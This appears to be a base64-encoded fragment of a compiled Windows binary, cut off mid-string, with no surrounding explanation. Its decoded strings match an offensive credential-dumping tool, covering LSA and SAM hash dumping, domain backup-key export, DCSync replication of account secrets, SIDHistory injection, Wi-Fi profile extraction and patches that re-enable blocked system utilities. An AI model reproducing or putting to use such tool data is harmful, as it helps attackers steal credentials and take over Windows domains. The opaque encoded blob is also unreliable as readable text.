bABsAAAAAAAAAGsAZQByAG4AZQBsADMAMgAuAGQAbABsAAAAAAAAAAAAU2FtSUNvbm5lY3QAAAAAAFNhbXJDbG9zZUhhbmRsZQBTYW1JUmV0cmlldmVQcmltYXJ5Q3JlZGVudGlhbHMAAFNhbXJPcGVuRG9tYWluAABTYW1yT3BlblVzZXIAAAAAU2FtclF1ZXJ5SW5mb3JtYXRpb25Vc2VyAAAAAAAAAABTYW1JRnJlZV9TQU1QUl9VU0VSX0lORk9fQlVGRkVSAExzYUlRdWVyeUluZm9ybWF0aW9uUG9saWN5VHJ1c3RlZAAAAAAAAABMc2FJRnJlZV9MU0FQUl9QT0xJQ1lfSU5GT1JNQVRJT04AAAAAAAAAVmlydHVhbEFsbG9jAAAAAExvY2FsRnJlZQAAAG1lbWNweQAAAAAAAHAAYQB0AGMAaAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAHQAVgBlAHIAeQBCAGEAcwBpAGMATQBvAGQAdQBsAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAHMARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAGkAbgBqAGUAYwB0AAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGwAcwBhACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBDAHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBDAG8AZABlAFcAaQB0AHQAaABQAGEAdAB0AGUAcgBuAFIAZQBwAGwAYQBjAGUACgAAAAAAAAAAAEQAbwBtAGEAaQBuACAAOgAgACUAdwBaACAALwAgAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBMAG8AbwBrAHUAcABJAGQAcwBJAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAIAA7ACAAJwAlAHMAJwAgAGkAcwAgAG4AbwB0ACAAYQAgAHYAYQBsAGkAZAAgAEkAZAAKAAAAAABuAGEAbQBlAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBMAG8AbwBrAHUAcABOAGEAbQBlAHMASQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAIAA7ACAAUwBhAG0ARQBuAHUAbQBlAHIAYQB0AGUAVQBzAGUAcgBzAEkAbgBEAG8AbQBhAGkAbgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBPAHAAZQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQAgADsAIABTAGEAbQBDAG8AbgBuAGUAYwB0ACAAJQAwADgAeAAKAAAAUwBhAG0AUwBzAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AbABzAGEAXwBnAGUAdABIAGEAbgBkAGwAZQAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBsAHMAYQBfAGcAZQB0AEgAYQBuAGQAbABlACAAOwAgAGsAdQBsAGwAXwBtAF8AcwBlAHIAdgBpAGMAZQBfAGcAZQB0AFUAbgBpAHEA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OgAgACAAIAAgACAAIAAgAAAAAAAAAEcAJABCAEMASwBVAFAASwBFAFkAXwBQAFIARQBGAEUAUgBSAEUARAAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AYgBrAGUAeQAgADsAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBMAHMAYQBSAGUAdAByAGkAZQB2AGUAUAByAGkAdgBhAHQAZQBEAGEAdABhADoAIAAwAHgAJQAwADgAeAAKAAAAAAAKAEMAbwBtAHAAYQB0AGkAYgBpAGwAaQB0AHkAIABwAHIAZQBmAGUAcgBlAGQAIABrAGUAeQA6ACAAAAAAAAAARwAkAEIAQwBLAFUAUABLAEUAWQBfAFAAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHIAcABkAGEAdABhACAAOwAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAEwAcwBhAFIAZQB0AHIAaQBlAHYAZQBQAHIAaQB2AGEAdABlAEQAYQB0AGEAOgAgADAAeAAlADAAOAB4AAoAAAAAAAAAAABbAEQAQwBdACAAJwAlAHMAJwAgAHcAaQBsAGwAIABiAGUAIAB0AGgAZQAgAGQAbwBtAGEAaQBuAAoAAABkAGMAAAAAAAAAAABrAGQAYwAAAFsARABDAF0AIAAnACUAcwAnACAAdwBpAGwAbAAgAGIAZQAgAHQAaABlACAARABDACAAcwBlAHIAdgBlAHIACgAKAAAAAAAAAFsARABDAF0AIABPAGIAagBlAGMAdAAgAHcAaQB0AGgAIABHAFUASQBEACAAJwAlAHMAJwAKAAoAAAAAAAAAAAAAAAAAAAAAAFsARABDAF0AIAAnACUAcwAnACAAdwBpAGwAbAAgAGIAZQAgAHQAaABlACAAdQBzAGUAcgAgAGEAYwBjAG8AdQBuAHQACgAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZABjAHMAeQBuAGMAIAA7ACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBQAHIAbwBjAGUAcwBzAEcAZQB0AE4AQwBDAGgAYQBuAGcAZQBzAFIAZQBwAGwAeQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZABjAHMAeQBuAGMAIAA7ACAARABSAFMARwBlAHQATgBDAEMAaABhAG4AZwBlAHMALAAgAGkAbgB2AGEAbABpAGQAIABkAHcATwB1AHQAVgBlAHIAcwBpAG8AbgAgAGEAbgBkAC8AbwByACAAYwBOAHUAbQBPAGIAagBlAGMAdABzAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBkAGMAcwB5AG4AYwAgADsAIABHAGUAdABOAEMAQwBoAGEAbgBnAGUAcwA6ACAAMAB4ACUAMAA4AHgAIAAoACUAdQApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGQAYwBzAHkAbgBjACAAOwAgAFIAUABDACAARQB4AGMAZQBwAHQAaQBvAG4AIAAwAHgAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZABjAHMAeQBuAGMAIAA7ACAATQBpAHMAcwBpAG4AZwAgAHUAcwBlAHIAIABvAHIAIABnAHUAaQBkACAAYQByAGcAdQBtAGUAbgB0AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBkAGMAcwB5AG4AYwAgADsAIABEAG8AbQBhAGkAbgAgAEMAbwBuAHQAcgBvAGwAbABlAHIAIABuAG8AdAAgAHAAcgBlAHMAZQBuAHQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGQAYwBzAHkAbgBjACAAOwAgAEQAbwBtAGEAaQBuACAAbgBvAHQAIABwAHIAZQBzAGUAbgB0ACwAIABvAHIAIABkAG8AZQBzAG4AJwB0ACAAbABvAG8AawAgAGwAaQBrAGUAIABhACAARgBRAEQATgAKAAAAAAAlAHMAJQAuACoAcwAlAHMAAAAAAAAAAAAgACAAIAAgACUAcwAtACUAMgB1ADoAIAAAAAAAAAAAACAAIABIAGEAcwBoACAAJQBzADoAIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGQAYwBzAHkAbgBjAF8AZABlAGMAcgB5AHAAdAAgADsAIABSAHQAbABEAGUAYwByAHkAcAB0AEQARQBTADIAYgBsAG8AYwBrAHMAMQBEAFcATwBSAEQAAAAAAAAAAABPAGIAagBlAGMAdAAgAFIARABOACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAABTAEMAUgBJAFAAVAAAAAAAQQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAAAAAAAwAHgANAAgAD8AAAAAAAAASABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAAAAAAAAAAAAEwATwBDAEsATwBVAFQAAABQAEEAUwBTAFcARABfAE4ATwBUAFIARQBRAEQAAAAAAFAAQQBTAFMAVwBEAF8AQwBBAE4AVABfAEMASABBAE4ARwBFAAAAAAAAAAAAAAAAAEUATgBDAFIAWQBQAFQARQBEAF8AVABFAFgAVABfAFAAQQBTAFMAVwBPAFIARABfAEEATABMAE8AVwBFAEQAAABUAEUATQBQAF8ARABVAFAATABJAEMAQQBUAEUAXwBBAEMAQwBPAFUATgBUAAAAAABOAE8AUgBNAEEATABfAEEAQwBDAE8AVQBOAFQAAAAAADAAeAA0ADAAMAAgAD8AAABJAE4AVABFAFIARABPAE0AQQBJAE4AXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAAAAAAAAAFcATwBSAEsAUwBUAEEAVABJAE8ATgBfAFQAUgBVAFMAVABfAEEAQwBDAE8AVQBOAFQAAAAAAAAAUwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAAAAAAAAAAAAMAB4ADQAMAAwADAAIAA/AAAAAAAAAAAAMAB4ADgAMAAwADAAIAA/AAAAAAAAAAAARABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAEQAAAAAAE0ATgBTAF8ATABPAEcATwBOAF8AQQBDAEMATwBVAE4AVAAAAAAAAABTAE0AQQBSAFQAQwBBAFIARABfAFIARQBRAFUASQBSAEUARAAAAAAAVABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgAAAAAATgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAAAAAAAAABVAFMARQBfAEQARQBTAF8ASwBFAFkAXwBPAE4ATABZAAAAAAAAAAAARABPAE4AVABfAFIARQBRAFUASQBSAEUAXwBQAFIARQBBAFUAVABIAAAAAAAAAAAAUABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAAAAAAAAAAAAAAAAAAAAAAAVABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgARQBOAFQASQBDAEEAVABFAF8ARgBPAFIAXwBEAEUATABFAEcAQQBUAEkATwBOAAAAAABOAE8AXwBBAFUAVABIAF8ARABBAFQAQQBfAFIARQBRAFUASQBSAEUARAAAAAAAAABQAEEAUgBUAEkAQQBMAF8AUwBFAEMAUgBFAFQAUwBfAEEAQwBDAE8AVQBOAFQAAABVAFMARQBfAEEARQBTAF8ASwBFAFkAUwAAAAAAAAAAADAAeAAxADAAMAAwADAAMAAwADAAIAA/AAAAAAAAAAAAMAB4ADIAMAAwADAAMAAwADAAMAAgAD8AAAAAAAAAAAAwAHgANAAwADAAMAAwADAAMAAwACAAPwAAAAAAAAAAADAAeAA4ADAAMAAwADAAMAAwADAAIAA/AAAAAAAAAAAARABPAE0AQQBJAE4AXwBPAEIASgBFAEMAVAAAAAAAAABHAFIATwBVAFAAXwBPAEIASgBFAEMAVAAAAAAAAAAAAE4ATwBOAF8AUwBFAEMAVQBSAEkAVABZAF8ARwBSAE8AVQBQAF8ATwBCAEoARQBDAFQAAAAAAAAAQQBMAEkAQQBTAF8ATwBCAEoARQBDAFQAAAAAAAAAAABOAE8ATgBfAFMARQBDAFUAUgBJAFQAWQBfAEEATABJAEEAUwBfAE8AQgBKAEUAQwBUAAAAAAAAAFUAUwBFAFIAXwBPAEIASgBFAEMAVAAAAE0AQQBDAEgASQBOAEUAXwBBAEMAQwBPAFUATgBUAAAAVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAAAAAAAAABBAFAAUABfAEIAQQBTAEkAQwBfAEcAUgBPAFUAUAAAAEEAUABQAF8AUQBVAEUAUgBZAF8ARwBSAE8AVQBQAAAAKgAqACAAUwBBAE0AIABBAEMAQwBPAFUATgBUACAAKgAqAAoACgAAAFMAQQBNACAAVQBzAGUAcgBuAGEAbQBlACAAIAAgACAAIAAgACAAIAAgADoAIAAAAFUAcwBlAHIAIABQAHIAaQBuAGMAaQBwAGEAbAAgAE4AYQBtAGUAIAAgADoAIAAAAEEAYwBjAG8AdQBuAHQAIABUAHkAcABlACAAIAAgACAAIAAgACAAIAAgADoAIAAlADAAOAB4ACAAKAAgACUAcwAgACkACgAAAFUAcwBlAHIAIABBAGMAYwBvAHUAbgB0ACAAQwBvAG4AdAByAG8AbAAgADoAIAAlADAAOAB4ACAAKAAgAAAAAABBAGMAYwBvAHUAbgB0ACAAZQB4AHAAaQByAGEAdABpAG8AbgAgACAAIAA6ACAAAABQAGEAcwBzAHcAbwByAGQAIABsAGEAcwB0ACAAYwBoAGEAbgBnAGUAIAA6ACAAAABPAGIAagBlAGMAdAAgAFMAZQBjAHUAcgBpAHQAeQAgAEkARAAgACAAIAA6ACAAAABPAGIAagBlAGMAdAAgAFIAZQBsAGEAdABpAHYAZQAgAEkARAAgACAAIAA6ACAAJQB1AAoAAAAAAAoAQwByAGUAZABlAG4AdABpAGEAbABzADoACgAAAAAAbgB0AGwAbQAAAAAAAAAAAGwAbQAgACAAAAAAAAAAAAAKAFMAdQBwAHAAbABlAG0AZQBuAHQAYQBsACAAQwByAGUAZABlAG4AdABpAGEAbABzADoACgAAACoAIAAlAHcAWgAgACoACgAAAAAAJTAyeAAAAAAAAAAAAAAAAAAAAAAqACoAIABUAFIAVQBTAFQARQBEACAARABPAE0AQQBJAE4AIAAtACAAQQBuAHQAaQBzAG8AYwBpAGEAbAAgACoAKgAKAAoAAABQAGEAcgB0AG4AZQByACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQB3AFoACgAAAGMAbQBkAAAAAAAAAAAAAABDAG8AbQBtAGEAbgBkACAAUAByAG8AbQBwAHQAIAAgACAAIAAgACAAIAAgACAAIAAoAHcAaQB0AGgAbwB1AHQAIABEAGkAcwBhAGIAbABlAEMATQBEACkAAAAAAAAAAAByAGUAZwBlAGQAaQB0AAAAUgBlAGcAaQBzAHQAcgB5ACAARQBkAGkAdABvAHIAIAAgACAAIAAgACAAIAAgACAAKAB3AGkAdABoAG8AdQB0ACAARABpAHMAYQBiAGwAZQBSAGUAZwBpAHMAdAByAHkAVABvAG8AbABzACkAAAAAAHQAYQBzAGsAbQBnAHIAAABUAGEAcwBrACAATQBhAG4AYQBnAGUAcgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAHcAaQB0AGgAbwB1AHQAIABEAGkAcwBhAGIAbABlAFQAYQBzAGsATQBnAHIAKQAAAAAAAAAAAG4AYwByAG8AdQB0AGUAbQBvAG4AAAAAAEoAdQBuAGkAcABlAHIAIABOAGUAdAB3AG8AcgBrACAAQwBvAG4AbgBlAGMAdAAgACgAdwBpAHQAaABvAHUAdAAgAHIAbwB1AHQAZQAgAG0AbwBuAGkAdABvAHIAaQBuAGcAKQAAAAAAZABlAHQAbwB1AHIAcwAAAAAAAAAAAAAAWwBlAHgAcABlAHIAaQBtAGUAbgB0AGEAbABdACAAVAByAHkAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQAgAGEAbABsACAAbQBvAGQAdQBsAGUAcwAgAHcAaQB0AGgAIABEAGUAdABvAHUAcgBzAC0AbABpAGsAZQAgAGgAbwBvAGsAcwAAAHcAaQBmAGkAAAAAAAAAAABhAGQAZABzAGkAZAAAAAAAbQBlAG0AcwBzAHAAAAAAAHMAawBlAGwAZQB0AG8AbgAAAAAAAAAAAG0AaQBzAGMAAAAAAAAAAABNAGkAcwBjAGUAbABsAGEAbgBlAG8AdQBzACAAbQBvAGQAdQBsAGUAAAAAAAAAAAB3AGwAYQBuAGEAcABpAAAAV2xhbk9wZW5IYW5kbGUAAFdsYW5DbG9zZUhhbmRsZQBXbGFuRW51bUludGVyZmFjZXMAAAAAAABXbGFuR2V0UHJvZmlsZUxpc3QAAAAAAABXbGFuR2V0UHJvZmlsZQAAV2xhbkZyZWVNZW1vcnkAAEsAaQB3AGkAQQBuAGQAQwBNAEQAAAAAAEQAaQBzAGEAYgBsAGUAQwBNAEQAAAAAAGMAbQBkAC4AZQB4AGUAAABLAGkAdwBpAEEAbgBkAFIAZQBnAGkAcwB0AHIAeQBUAG8AbwBsAHMAAAAAAAAAAABEAGkAcwBhAGIAbABlAFIAZQBnAGkAcwB0AHIAeQBUAG8AbwBsAHMAAAAAAAAAAAByAGUAZwBlAGQAaQB0AC4AZQB4AGUAAABLAGkAdwBpAEEAbgBkAFQAYQBzAGsATQBnAHIAAAAAAEQAaQBzAGEAYgBsAGUAVABhAHMAawBNAGcAcgAAAAAAdABhAHMAawBtAGcAcgAuAGUAeABlAAAAZABzAE4AYwBTAGUAcgB2AGkAYwBlAAAACQAoACUAdwBaACkAAAAAAAkAWwAlAHUAXQAgACUAdwBaACAAIQAgAAAAAAAAAAAAJQAtADMAMgBTAAAAAAAAACMAIAAlAHUAAAAAAAAAAAAJACAAJQBwACAALQA+ACAAJQBwAAAAAAAlAHcAWgAgACgAJQB1ACkACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGQAZQB0AG8AdQByAHMAXwBjAGEAbABsAGIAYQBjAGsAXwBwAHIAbwBjAGUAcwBzACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAFAAYQB0AGMAaAAgAE8ASwAgAGYAbwByACAAJwAlAHMAJwAgAGYAcgBvAG0AIAAnACUAcwAnACAAdABvACAAJwAlAHMAJwAgAEAAIAAlAHAACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGcAZQBuAGUAcgBpAGMAXwBuAG8AZwBwAG8AXwBwAGEAdABjAGgAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAbgBvAHQAXwByAGUAYQBkAHkAAAAAAAAAYwBvAG4AbgBlAGMAdABlAGQAAAAAAAAAYQBkAF8AaABvAGMAXwBuAGUAdAB3AG8AcgBrAF8AZgBvAHIAbQBlAGQAAAAAAAAAZABpAHMAYwBvAG4AbgBlAGMAdABpAG4AZwAAAAAAAABkAGkAcwBjAG8AbgBuAGUAYwB0AGUAZAAAAAAAAAAAAGEAcwBzAG8AYwBpAGEAdABpAG4AZwAAAGQAaQBzAGMAbwB2AGUAcgBpAG4AZwAAAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG4AZwAAAAAAIAAqACAAAAAgAC8AIAAlAHMAIAAtACAAJQBzAAoAAAAJAHwAIAAlAHMACgAAAAAAbgB0AGQAcwBhAGkALgBkAGwAbAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBhAGQAZABzAGkAZAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYwBvAHAAeQAgACgAYgBhAGMAawB1AHAAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAUwBlAGEAcgBjAGgAIAAlAHUAIAA6ACAAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGEAZABkAHMAaQBkACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBzAGUAYQByAGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AYQBkAGQAcwBpAGQAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAGMAbwBwAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGEAZABkAHMAaQBkACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBwAHIAbwB0AGUAYwB0ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFMASQBEAEgAaQBzAHQAbwByAHkAIABmAG8AcgAgACcAJQBzACcACgAAAAAAAAAAACAAKgAgACUAcwAJAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGEAZABkAHMAaQBkACAAOwAgAEQAcwBBAGQAZABTAGkAZABIAGkAcwB0AG8AcgB5ADoAIAAwAHgAJQAwADgAeAAgACgAJQB1ACkAIQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AYQBkAGQAcwBpAGQAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAGEAZABkAHMAaQBkACAAOwAgAEQAcwBCAGkAbgBkADoAIAAlADAAOAB4ACAAKAAlAHUAKQAhAAoAAAAAAEUAUgBSAE8AUgAgAGsA